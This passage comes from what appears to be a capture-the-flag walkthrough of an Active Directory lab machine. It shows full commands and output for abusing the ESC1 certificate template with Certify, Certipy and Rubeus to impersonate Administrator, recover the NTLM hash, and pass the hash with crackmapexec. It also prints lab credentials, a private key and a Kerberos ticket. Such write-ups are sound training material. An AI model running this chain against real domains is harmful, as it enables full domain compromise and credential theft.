MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEArHXTsiJHz6+FklAEj8XERrnpII8xtUkrnzm1i8Zr1TOYrmms1URpU07x
LK9g0eBanG1VtuHfHljuk31DhT/X4xV8x/buyON52oQbZhUDyvy7oUr1AGjkpOlR
zP4+n2x6FwMEexzVXYjU+4d91/LWFDSTiMdxL0fgdGd8ROcEjThMb4XhmERoKeR8
/f4bq2r7N/q3XeMtx1PyHFHRimvilwzP1q+tu4mpVT+a20EBIsaSqlfiHCOMttit
kwUK4YH24/TiWa0R2xRwG5joD3lt41IIatRtDyCsSIMh0BdLw8YHJgbTc8UwRJLq
VCqdWRpXDl1NlwptIRJw2le/LV1W4w==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx ←



Certify completed in 00:00:05.1817801
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./pubkey.pem`:
```
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA01Cs7rQAVycwAAAAAADTANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjQxMTA1MTgyNzMyWhcNMzQxMTAz
MTgyNzMyWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC8y2HhM+Dj9J1LNmxXQ+wvuJpd
3by8Ao7kEUs8LufksK/jXsIPrNo/RTnObtSarQecgCihZBaxyZHPqPBuTUEoQrnk
pdXMUZlxOMhz8Jm45JXdfhQNZxSJ+0vmRVqf8tqO+FnXA8MAttt40gzl+ssIX6ZY
UEY5ra5yGpyJBvbv8JA/SNJAEYKFLG6jlwEWF+MrvFGfz9I98+prkmm5va2amcR9
L44oeypXtZMyM7BpmrMWzLWm07DWtKPldgPX1ygwICFEyXrS7IuSU9VTSm7EWYd/
HT2poPvlNgfj6cZ/SgEFldLD+y7/NPAP6maHACrEyb09HMG+XivzdnBZIeYBAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFFe4tenVO4e2EFU7bWZO5UVW3Tva
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEArHXTsiJHz6+FklAEj8XERrnpII8xtUkrnzm1i8Zr1TOYrmms1URpU07x
LK9g0eBanG1VtuHfHljuk31DhT/X4xV8x/buyON52oQbZhUDyvy7oUr1AGjkpOlR
zP4+n2x6FwMEexzVXYjU+4d91/LWFDSTiMdxL0fgdGd8ROcEjThMb4XhmERoKeR8
/f4bq2r7N/q3XeMtx1PyHFHRimvilwzP1q+tu4mpVT+a20EBIsaSqlfiHCOMttit
kwUK4YH24/TiWa0R2xRwG5joD3lt41IIatRtDyCsSIMh0BdLw8YHJgbTc8UwRJLq
VCqdWRpXDl1NlwptIRJw2le/LV1W4w==
-----END CERTIFICATE-----
```

`vim ./privkey.pem`:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAvMth4TPg4/SdSzZsV0PsL7iaXd28vAKO5BFLPC7n5LCv417C
D6zaP0U5zm7Umq0HnIAooWQWscmRz6jwbk1BKEK55KXVzFGZcTjIc/CZuOSV3X4U
DWcUiftL5kVan/LajvhZ1wPDALbbeNIM5frLCF+mWFBGOa2uchqciQb27/CQP0jS
QBGChSxuo5cBFhfjK7xRn8/SPfPqa5Jpub2tmpnEfS+OKHsqV7WTMjOwaZqzFsy1
ptOw1rSj5XYD19coMCAhRMl60uyLklPVU0puxFmHfx09qaD75TYH4+nGf0oBBZXS
w/su/zTwD+pmhwAqxMm9PRzBvl4r83ZwWSHmAQIDAQABAoIBAHapAgkQmU3NRjuq
pienCkDoLyXGI0Sr+vF/qSDXfmqvXq1ytlgx1S6lLPMBl+Dr1ffYWTEu/lCaF2pE
jXFWXxiV7861KI51zxJplRvB4mxiR4tiHepamn8rEgZWGuKjOhlYIOdSdvLw+zqS
EwdNPOUzcRLayXihIB6ZeT9qwDQHkrIMMPia4ju+IKCnOD6E60NO9WcNs1DPeEZL
lrUyadOD7aPNsRMgBRPfC6zvaz/lm5fEmE0tMVO3lwGH1UXGTVlIUgaKuoZmfx4S
MFlAuQcSspf+RElxp1820DyWdlmhsD6BLjXN0cw41LleZfPVpA4yiirhIYuxYD+t
jYHLM10CgYEAyLeeSBk1tgVsyhPzDUDYXnB8UadVc4pAblyofJ+IR1M/FogGunKI
TAzmTEvqCjh9dyqHCrES25y5c28itgbXt7AwHl2PnqnGG602pIK/LYEUsspL1CRR
jBLm/IXsUoaudJnLXdgT79poq4FHiWwVFkAlBDjUCi902fiGiNxM5scCgYEA8MsZ
XVGDP80UOELAAeSRJAmwAFS9ARucNYa4X9aAjoiM8fA9zAe7C10cp+ipRXEXfqAr
Pc1Q0u8JH/xSGw+z/TvRSfc/605HMvdfJCCOBmooUzHlDk/bG0SYJecJrAeF88yh
Kpc+OjPdgib9G+ZJUXAmKMJJH+PDvSHAL0lq5PcCgYEAtiB/HDbb2NVlWJvvgEgl
zNPOypzG2fdJ7ZpgO+zaULYF2eEGEepZKIDP+80qiammlxncvWPdk67LTCY83eSp
mwDhOLx21GaC35w1p+MHrDejW3RaiB2IbUy9kcfHnz6cUCs5MGcf+BU7wtuk2Npc
6/q6W/Fg3fkf06VCFi+oDAMCgYEAnP8vGIMPGkgySMRswE8wuth+Ipkdal2AKf4e
tI383/H0Q8Kp6B+aOryI9Ilj5FzqPqtbxj3Z1s33mx0+w1ontpKL0LgeuuMc1QQo
yjtXnqMUi7naaMx0RYEh2oSa78kv81eWNVjLP9OVN0kIempZn3mJx8V1PA+bDfO1
hJ9PzN0CgYEAs1nHBbzA84VMrghmzzi7RcuyGMMnqbwqNUYWJqXlq/UKDSx2/66V
nV1hi71CR922ItOiqepJ6cp3yUpGIl879Zou290e+/UjLBsBqi1rcZslvGOk/PdK
LPB+N0rnVI6X/oEk5PZmXdsEp0xXf+SX7EtXcX1TpIn0JEtdkasCRZA=
-----END RSA PRIVATE KEY-----
```

`evil-winrm -i 10.10.11.202 -S -c ./pubkey.pem -k ./privkey.pem`:
```
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
```
❌

`sudo nmap -Pn -sS -p5985,5986 10.10.11.202`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 12:06 CET
Nmap scan report for dc.sequel.htb (10.10.11.202)
Host is up (0.062s latency).

PORT     STATE    SERVICE
5985/tcp open     wsman
5986/tcp filtered wsmans ←

Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds
```

`vim ./cert.pem`:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAvMth4TPg4/SdSzZsV0PsL7iaXd28vAKO5BFLPC7n5LCv417C
D6zaP0U5zm7Umq0HnIAooWQWscmRz6jwbk1BKEK55KXVzFGZcTjIc/CZuOSV3X4U
DWcUiftL5kVan/LajvhZ1wPDALbbeNIM5frLCF+mWFBGOa2uchqciQb27/CQP0jS
QBGChSxuo5cBFhfjK7xRn8/SPfPqa5Jpub2tmpnEfS+OKHsqV7WTMjOwaZqzFsy1
ptOw1rSj5XYD19coMCAhRMl60uyLklPVU0puxFmHfx09qaD75TYH4+nGf0oBBZXS
w/su/zTwD+pmhwAqxMm9PRzBvl4r83ZwWSHmAQIDAQABAoIBAHapAgkQmU3NRjuq
pienCkDoLyXGI0Sr+vF/qSDXfmqvXq1ytlgx1S6lLPMBl+Dr1ffYWTEu/lCaF2pE
jXFWXxiV7861KI51zxJplRvB4mxiR4tiHepamn8rEgZWGuKjOhlYIOdSdvLw+zqS
EwdNPOUzcRLayXihIB6ZeT9qwDQHkrIMMPia4ju+IKCnOD6E60NO9WcNs1DPeEZL
lrUyadOD7aPNsRMgBRPfC6zvaz/lm5fEmE0tMVO3lwGH1UXGTVlIUgaKuoZmfx4S
MFlAuQcSspf+RElxp1820DyWdlmhsD6BLjXN0cw41LleZfPVpA4yiirhIYuxYD+t
jYHLM10CgYEAyLeeSBk1tgVsyhPzDUDYXnB8UadVc4pAblyofJ+IR1M/FogGunKI
TAzmTEvqCjh9dyqHCrES25y5c28itgbXt7AwHl2PnqnGG602pIK/LYEUsspL1CRR
jBLm/IXsUoaudJnLXdgT79poq4FHiWwVFkAlBDjUCi902fiGiNxM5scCgYEA8MsZ
XVGDP80UOELAAeSRJAmwAFS9ARucNYa4X9aAjoiM8fA9zAe7C10cp+ipRXEXfqAr
Pc1Q0u8JH/xSGw+z/TvRSfc/605HMvdfJCCOBmooUzHlDk/bG0SYJecJrAeF88yh
Kpc+OjPdgib9G+ZJUXAmKMJJH+PDvSHAL0lq5PcCgYEAtiB/HDbb2NVlWJvvgEgl
zNPOypzG2fdJ7ZpgO+zaULYF2eEGEepZKIDP+80qiammlxncvWPdk67LTCY83eSp
mwDhOLx21GaC35w1p+MHrDejW3RaiB2IbUy9kcfHnz6cUCs5MGcf+BU7wtuk2Npc
6/q6W/Fg3fkf06VCFi+oDAMCgYEAnP8vGIMPGkgySMRswE8wuth+Ipkdal2AKf4e
tI383/H0Q8Kp6B+aOryI9Ilj5FzqPqtbxj3Z1s33mx0+w1ontpKL0LgeuuMc1QQo
yjtXnqMUi7naaMx0RYEh2oSa78kv81eWNVjLP9OVN0kIempZn3mJx8V1PA+bDfO1
hJ9PzN0CgYEAs1nHBbzA84VMrghmzzi7RcuyGMMnqbwqNUYWJqXlq/UKDSx2/66V
nV1hi71CR922ItOiqepJ6cp3yUpGIl879Zou290e+/UjLBsBqi1rcZslvGOk/PdK
LPB+N0rnVI6X/oEk5PZmXdsEp0xXf+SX7EtXcX1TpIn0JEtdkasCRZA=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA01Cs7rQAVycwAAAAAADTANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjQxMTA1MTgyNzMyWhcNMzQxMTAz
MTgyNzMyWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC8y2HhM+Dj9J1LNmxXQ+wvuJpd
3by8Ao7kEUs8LufksK/jXsIPrNo/RTnObtSarQecgCihZBaxyZHPqPBuTUEoQrnk
pdXMUZlxOMhz8Jm45JXdfhQNZxSJ+0vmRVqf8tqO+FnXA8MAttt40gzl+ssIX6ZY
UEY5ra5yGpyJBvbv8JA/SNJAEYKFLG6jlwEWF+MrvFGfz9I98+prkmm5va2amcR9
L44oeypXtZMyM7BpmrMWzLWm07DWtKPldgPX1ygwICFEyXrS7IuSU9VTSm7EWYd/
HT2poPvlNgfj6cZ/SgEFldLD+y7/NPAP6maHACrEyb09HMG+XivzdnBZIeYBAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFFe4tenVO4e2EFU7bWZO5UVW3Tva
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEArHXTsiJHz6+FklAEj8XERrnpII8xtUkrnzm1i8Zr1TOYrmms1URpU07x
LK9g0eBanG1VtuHfHljuk31DhT/X4xV8x/buyON52oQbZhUDyvy7oUr1AGjkpOlR
zP4+n2x6FwMEexzVXYjU+4d91/LWFDSTiMdxL0fgdGd8ROcEjThMb4XhmERoKeR8
/f4bq2r7N/q3XeMtx1PyHFHRimvilwzP1q+tu4mpVT+a20EBIsaSqlfiHCOMttit
kwUK4YH24/TiWa0R2xRwG5joD3lt41IIatRtDyCsSIMh0BdLw8YHJgbTc8UwRJLq
VCqdWRpXDl1NlwptIRJw2le/LV1W4w==
-----END CERTIFICATE-----
```

`openssl pkcs12 -in ./cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ./cert.pfx`:
```
Enter Export Password:
Verifying - Enter Export Password:
```

`ls -l ./cert.*`:
```
-rw-rw-r-- 1 kali kali 3846 Nov  5 11:53 cert.pem
-rw------- 1 kali kali 3441 Nov  5 11:53 cert.pfx
```

`file ./cert.pfx`:
```
./cert.pfx: data
```

`upload ./cert.pfx`:
```
Info: Uploading /home/kali/cert.pfx to C:\Users\Ryan.Cooper\Documents\cert.pfx
                                        
Data: 4588 bytes of 4588 bytes copied
                                        
Info: Upload successful!
```

`cp ~/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe ./rubeus.exe`

`upload ./rubeus.exe`:
```
Info: Uploading /home/kali/rubeus.exe to C:\Users\Ryan.Cooper\Documents\rubeus.exe
                                        
Data: 617128 bytes of 617128 bytes copied
                                        
Info: Upload successful!
```

![Victim: ryan.cooper](https://custom-icon-badges.demolab.com/badge/Victim-ryan.cooper-64b5f6?logo=windows11&logoColor=white)

`./rubeus.exe asktgt /user:Administrator /certificate:./cert.pfx /getcredentials /show /nowrap`:
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Got domain: sequel.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::7092:e6bb:69b:92be%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  11/5/2024 10:55:00 AM
  EndTime                  :  11/5/2024 8:55:00 PM
  RenewTill                :  11/12/2024 10:55:00 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  zkz8uqB1qLZN8XGHMW0Kxg==
  ASREP (key)              :  B2650D88FDE62A5AB5C2DD54E7561630

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE ←
```

<🔄 Alternative Step>

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`certipy-ad find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -target 10.10.11.202 -stdout -vulnerable`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA ←
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication ←
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions ←
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication ←
```

`certipy-ad req -u 'Ryan.Cooper' -p 'NuclearMosquito3' -target 10.10.11.202 -upn Administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.20) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx' ←
```

Now that we have a certificate for the administrator we can use `certipy` once more to get a Ticket Granting Ticket (TGT) and extract the NT hash for this user. Since this step requires some Kerberos interaction, we need to synchronize our clock to the time of the remote machine before we can proceed.

`file ./administrator.pfx`:
```
./administrator.pfx: data
```

`certipy-ad auth -pfx ./administrator.pfx`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
❌

`sudo ntpdate 10.10.11.202`:
```
2024-11-05 20:36:53.776683 (+0100) +28795.759347 +/- 0.079190 10.10.11.202 s1 no-leap
CLOCK: time stepped by 28795.759347
```

`certipy-ad auth -pfx ./administrator.pfx`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee ←
```

</🔄 Alternative Step>

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`crackmapexec smb 10.10.11.202 -u 'Administrator' -H ':A52F78E4C751E5F5E17E1E9F3E58F4EE'`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\Administrator:A52F78E4C751E5F5E17E1E9F3E58F4EE (Pwn3d!) ←
```

